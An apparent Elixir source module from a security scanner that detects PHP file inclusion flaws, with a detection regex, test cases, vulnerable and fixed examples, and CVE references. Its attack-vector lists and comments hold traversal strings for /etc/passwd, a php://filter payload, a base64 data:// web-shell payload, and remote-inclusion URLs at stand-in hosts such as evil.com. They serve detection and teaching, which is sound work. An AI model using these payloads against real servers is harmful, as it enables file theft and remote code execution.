defmodule Rsolv.Security.Patterns.Php.FileInclusion do
  @moduledoc """
  Pattern for detecting File Inclusion vulnerabilities in PHP.

  This pattern identifies when user input is used to dynamically include files,
  which can lead to Local File Inclusion (LFI) or Remote File Inclusion (RFI)
  vulnerabilities. These are among the most critical vulnerabilities in PHP.

  ## Vulnerability Details

  File inclusion vulnerabilities occur when user-controlled input is used to
  specify which file to include using PHP's include/require functions. This can
  allow attackers to read sensitive files (LFI) or execute remote code (RFI).

  ### Attack Example
  ```php
  // Vulnerable code
  include $_GET['page'] . '.php';

  // LFI Attack: ?page=../../../../etc/passwd%00
  // RFI Attack: ?page=http://evil.com/shell
  ```
  """

  use Rsolv.Security.Patterns.PatternBase
  alias Rsolv.Security.Pattern

  @impl true
  def pattern do
    %Pattern{
      id: "php-file-inclusion",
      name: "File Inclusion Vulnerability",
      description: "Dynamic file inclusion with user input",
      type: :file_inclusion,
      severity: :critical,
      languages: ["php"],
      regex:
        ~r/(include|require|include_once|require_once)\s*\(?\s*.*\$_(GET|POST|REQUEST|COOKIE)/,
      cwe_id: "CWE-98",
      owasp_category: "A03:2021",
      recommendation: "Use a whitelist of allowed files or avoid dynamic inclusion",
      test_cases: %{
        vulnerable: [
          ~S|include $_GET['page'] . '.php';|,
          ~S|require_once($_POST['module']);|
        ],
        safe: [
          ~S|$allowed = ['home', 'about', 'contact'];
$page = $_GET['page'];
if (in_array($page, $allowed)) {
    include $page . '.php';
}|
        ]
      }
    }
  end

  @impl true
  def vulnerability_metadata do
    %{
      description: """
      File inclusion vulnerabilities are among the most severe in PHP applications.
      They occur when user input is used to determine which file to include, potentially
      allowing attackers to include arbitrary files from the local filesystem (LFI) or
      even remote URLs (RFI).

      Types of file inclusion attacks:
      - Local File Inclusion (LFI): Reading local files
      - Remote File Inclusion (RFI): Including remote malicious files
      - Directory Traversal: Using ../ to access files outside web root
      - PHP Filter Bypass: Using php://filter to read source code
      - Data Wrapper: Using data:// to inject code

      The impact can range from information disclosure to complete system compromise.
      """,
      references: [
        %{
          type: :cwe,
          id: "CWE-98",
          title:
            "Improper Control of Filename for Include/Require Statement in PHP Program ('PHP Remote File Inclusion')",
          url: "https://cwe.mitre.org/data/definitions/98.html"
        },
        %{
          type: :owasp,
          id: "A03:2021",
          title: "OWASP Top 10 2021 - A03 Injection",
          url: "https://owasp.org/Top10/A03_2021-Injection/"
        },
        %{
          type: :research,
          id: "file_inclusion_attacks",
          title: "File Inclusion Attacks - Understanding LFI and RFI",
          url: "https://www.indusface.com/learning/file-inclusion-attacks-lfi-rfi/"
        },
        %{
          type: :research,
          id: "php_lfi_rfi",
          title: "Remote File Inclusion (RFI) Explained",
          url: "https://www.invicti.com/learn/remote-file-inclusion-rfi/"
        }
      ],
      attack_vectors: [
        "Directory traversal: ?page=../../../../etc/passwd",
        "Null byte injection: ?file=../../../etc/passwd%00",
        "Double encoding: ?file=..%252f..%252fetc%252fpasswd",
        "PHP filters: ?page=php://filter/convert.base64-encode/resource=config",
        "Data wrapper: ?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
        "Remote inclusion: ?page=http://evil.com/shell.txt",
        "FTP wrapper: ?file=ftp://attacker.com/shell.txt",
        "Expect wrapper: ?file=expect://ls"
      ],
      real_world_impact: [
        "Source code disclosure revealing business logic and credentials",
        "Access to sensitive files like /etc/passwd or configuration files",
        "Remote code execution through malicious file inclusion",
        "Server-side request forgery (SSRF) attacks",
        "Complete server compromise via web shells",
        "Data exfiltration and intellectual property theft"
      ],
      cve_examples: [
        %{
          id: "CVE-2023-22973",
          description: "PHP file inclusion vulnerability allowing RCE",
          severity: "critical",
          cvss: 9.8,
          note: "Remote file inclusion leading to arbitrary code execution"
        },
        %{
          id: "CVE-2022-40089",
          description: "RFI vulnerability in Simple College Website",
          severity: "critical",
          cvss: 9.8,
          note: "Allows attackers to execute arbitrary PHP code via RFI"
        },
        %{
          id: "CVE-2023-3452",
          description: "WordPress Canto plugin RFI vulnerability",
          severity: "critical",
          cvss: 9.8,
          note: "Remote file inclusion via wp_abspath parameter"
        },
        %{
          id: "CVE-2022-3934",
          description: "LFI vulnerability in PHP web application",
          severity: "high",
          cvss: 7.5,
          note: "Local file inclusion allowing sensitive file access"
        },
        %{
          id: "CVE-2021-39165",
          description: "PHP CMS file inclusion vulnerability",
          severity: "critical",
          cvss: 9.8,
          note: "Both LFI and RFI possible through template parameter"
        }
      ],
      detection_notes: """
      This pattern detects file inclusion vulnerabilities by looking for:
      - Include/require statements with user input
      - All four inclusion functions: include, require, include_once, require_once
      - Both with and without parentheses syntax
      - User input from all superglobals

      The pattern is designed to catch common inclusion patterns where
      user input directly influences which file is included.
      """,
      safe_alternatives: [
        "Use a whitelist of allowed files",
        "Map user input to predefined file paths",
        "Avoid dynamic file inclusion entirely",
        "Use autoloading for classes instead of manual inclusion",
        "Disable allow_url_include in php.ini",
        "Validate and sanitize all file paths",
        "Use realpath() to resolve paths and check they're within allowed directories",
        "Implement a routing system instead of direct file inclusion"
      ],
      additional_context: %{
        common_mistakes: [
          "Trusting user input for file paths",
          "Not disabling allow_url_include for RFI protection",
          "Using only blacklist validation (e.g., blocking ../)",
          "Not checking if resolved path is within web root",
          "Forgetting about PHP wrappers and filters"
        ],
        secure_patterns: [
          "Whitelist: if (in_array($page, ['home', 'about'])) include $page.'.php';",
          "Path validation: if (strpos(realpath($file), '/allowed/path/') === 0)",
          "Switch statement: switch($page) { case 'home': include 'home.php'; break; }",
          "Modern routing: Use a framework with proper routing instead"
        ],
        php_specific_notes: [
          "allow_url_include must be disabled to prevent RFI",
          "Null bytes (%00) worked in PHP < 5.3.4 to bypass extensions",
          "PHP wrappers (php://, data://, etc.) can bypass filters",
          "include and require differ only in error handling",
          "Modern PHP frameworks handle routing safely by default"
        ]
      }
    }
  end

  @doc """
  Returns test cases for the pattern.

  ## Examples

      iex> test_cases = Rsolv.Security.Patterns.Php.FileInclusion.test_cases()
      iex> length(test_cases.positive) > 0
      true

      iex> test_cases = Rsolv.Security.Patterns.Php.FileInclusion.test_cases()
      iex> length(test_cases.negative) > 0
      true
  """
  def test_cases do
    %{
      positive: [
        %{
          code: ~S|include $_GET['page'] . '.php';|,
          description: "Direct inclusion with GET parameter"
        },
        %{
          code: ~S|require_once($_POST['module']);|,
          description: "Require once with POST parameter"
        },
        %{
          code: ~S|include_once 'templates/' . $_REQUEST['theme'] . '/header.php';|,
          description: "Path construction with user input"
        },
        %{
          code: ~S|require($_COOKIE['language'] . '/strings.php');|,
          description: "Language file inclusion"
        },
        %{
          code: ~S|include dirname(__FILE__) . '/' . $_GET['dir'] . '/config.php';|,
          description: "Complex path with user input"
        },
        %{
          code: ~S|require_once $_GET['plugin'];|,
          description: "Direct plugin inclusion"
        }
      ],
      negative: [
        %{
          code: ~S|include 'config.php';|,
          description: "Static file inclusion"
        },
        %{
          code: ~S|require_once __DIR__ . '/vendor/autoload.php';|,
          description: "Autoloader inclusion"
        },
        %{
          code: ~S|$allowed = ['home', 'about'];
if (in_array($_GET['page'], $allowed)) {
    include $_GET['page'] . '.php';
}|,
          description: "Whitelist validation before inclusion"
        },
        %{
          code: ~S|include constant('CONFIG_PATH') . '/settings.php';|,
          description: "Using predefined constants"
        }
      ]
    }
  end

  @doc """
  Returns examples of vulnerable and fixed code.
  """
  def examples do
    %{
      vulnerable: %{
        "Basic LFI vulnerability" => ~S"""
        // Page loader - VULNERABLE to LFI
        $page = $_GET['page'];
        include($page . '.php');

        // Attack: ?page=../../../../etc/passwd%00
        // Result: Displays system password file (PHP < 5.3.4)

        // Attack: ?page=../config
        // Result: Includes config.php from parent directory
        """,
        "Template inclusion vulnerability" => ~S"""
        // Template system - VULNERABLE to LFI/RFI
        $template = $_GET['template'];
        include('templates/' . $template);

        // LFI: ?template=../../../etc/passwd
        // RFI: ?template=http://evil.com/shell.txt (if allow_url_include=on)
        """,
        "Language file inclusion" => ~S"""
        // Multi-language support - VULNERABLE
        $lang = $_COOKIE['lang'];
        require_once("languages/$lang/strings.php");

        // Attack: Cookie: lang=../../uploads/shell
        // Includes uploaded malicious file
        """
      },
      fixed: %{
        "Whitelist approach" => ~S"""
        // Page loader - SECURE
        $allowed_pages = ['home', 'about', 'contact', 'products'];
        $page = $_GET['page'];

        if (in_array($page, $allowed_pages)) {
            include("pages/{$page}.php");
        } else {
            include("pages/404.php");
        }

        // Only predefined pages can be included
        """,
        "Path validation" => ~S"""
        // Template system - SECURE
        $template = basename($_GET['template']); // Remove directory components
        $template_path = realpath("templates/{$template}.php");
        $allowed_path = realpath("templates/");

        // Ensure the resolved path is within templates directory
        if ($template_path && strpos($template_path, $allowed_path) === 0) {
            include($template_path);
        } else {
            die("Invalid template");
        }
        """,
        "Modern routing approach" => ~S"""
        // Using a router instead of direct inclusion - SECURE
        class Router {
            private $routes = [
                'home' => 'controllers/HomeController.php',
                'about' => 'controllers/AboutController.php',
                'contact' => 'controllers/ContactController.php'
            ];

            public function route($page) {
                if (isset($this->routes[$page])) {
                    require_once($this->routes[$page]);
                    return true;
                }
                return false;
            }
        }

        $router = new Router();
        if (!$router->route($_GET['page'])) {
            require_once('controllers/NotFoundController.php');
        }
        """
      }
    }
  end

  @doc """
  Returns detailed vulnerability description.
  """
  def vulnerability_description do
    """
    File inclusion vulnerabilities are among the most dangerous security flaws in
    PHP applications. They allow attackers to include arbitrary files, potentially
    leading to source code disclosure, sensitive data exposure, or remote code execution.

    ## Types of File Inclusion

    ### Local File Inclusion (LFI)

    LFI allows reading files from the local filesystem:
    ```php
    include($_GET['file']);  // ?file=../../../../etc/passwd
    ```

    ### Remote File Inclusion (RFI)

    RFI allows including files from remote servers:
    ```php
    include($_GET['url']);  // ?url=http://evil.com/shell.txt
    ```

    RFI requires `allow_url_include=on` in php.ini (disabled by default).

    ## Attack Techniques

    ### Directory Traversal
    Using `../` to navigate directories:
    - `?page=../../../../etc/passwd`
    - `?file=../../../config/database.php`

    ### PHP Wrappers
    PHP provides various wrappers that can be abused:
    - `php://filter` - Read source code
    - `php://input` - Include POST data
    - `data://` - Include inline data
    - `expect://` - Execute system commands

    ### Null Byte Injection (Historical)
    In PHP < 5.3.4, null bytes could bypass file extension checks:
    - `?file=../../../etc/passwd%00.php`

    ## Real-World Impact

    1. **Information Disclosure**
       - Source code exposure
       - Configuration file access
       - Database credentials

    2. **Remote Code Execution**
       - Including malicious uploaded files
       - RFI with remote shells
       - Log poisoning attacks

    3. **Server Compromise**
       - Web shell installation
       - Privilege escalation
       - Lateral movement

    ## Prevention Strategies

    ### 1. Whitelist Approach
    ```php
    $allowed = ['home', 'about', 'contact'];
    if (in_array($_GET['page'], $allowed)) {
        include $_GET['page'] . '.php';
    }
    ```

    ### 2. Input Validation
    ```php
    $file = basename($_GET['file']);  // Remove path components
    $path = realpath("/allowed/path/$file");
    if (strpos($path, '/allowed/path/') === 0) {
        include $path;
    }
    ```

    ### 3. Modern Architecture
    - Use MVC frameworks with proper routing
    - Implement autoloading for classes
    - Avoid dynamic file inclusion entirely

    ## PHP Configuration

    Critical php.ini settings:
    - `allow_url_include = off` - Prevents RFI
    - `open_basedir` - Restricts file access
    - `disable_functions` - Disable dangerous functions

    ## Framework Protection

    Modern PHP frameworks provide safe alternatives:
    - **Laravel**: Route definitions and controllers
    - **Symfony**: Service container and routing
    - **WordPress**: Template hierarchy system

    File inclusion vulnerabilities are entirely preventable with proper
    input validation and modern development practices.
    """
  end

  @doc """
  Returns AST enhancement rules to reduce false positives.

  ## Examples

      iex> enhancement = Rsolv.Security.Patterns.Php.FileInclusion.ast_enhancement()
      iex> Map.keys(enhancement) |> Enum.sort()
      [:ast_rules, :min_confidence]

      iex> enhancement = Rsolv.Security.Patterns.Php.FileInclusion.ast_enhancement()
      iex> enhancement.min_confidence
      0.85

      iex> enhancement = Rsolv.Security.Patterns.Php.FileInclusion.ast_enhancement()
      iex> length(enhancement.ast_rules)
      4
  """
  @impl true
  def ast_enhancement do
    %{
      ast_rules: [
        %{
          type: "inclusion_context",
          description: "Verify file inclusion context",
          functions: [
            "include",
            "require",
            "include_once",
            "require_once"
          ],
          note: "All four PHP inclusion functions are vulnerable"
        },
        %{
          type: "path_validation",
          description: "Check for path validation functions",
          safe_functions: [
            "realpath",
            "basename",
            "pathinfo",
            "is_file",
            "file_exists",
            "is_readable"
          ],
          validation_patterns: [
            "in_array",
            "array_key_exists",
            "isset",
            "switch"
          ]
        },
        %{
          type: "safe_patterns",
          description: "Patterns that indicate safe usage",
          patterns: [
            "__DIR__",
            "__FILE__",
            "dirname",
            "DIRECTORY_SEPARATOR",
            "constant",
            "define"
          ],
          note: "Using constants and magic constants is generally safe"
        },
        %{
          type: "dangerous_wrappers",
          description: "PHP wrappers that can be exploited",
          wrappers: [
            "php://",
            "file://",
            "http://",
            "https://",
            "ftp://",
            "data://",
            "expect://",
            "zip://",
            "phar://"
          ]
        }
      ],
      min_confidence: 0.85
    }
  end
end
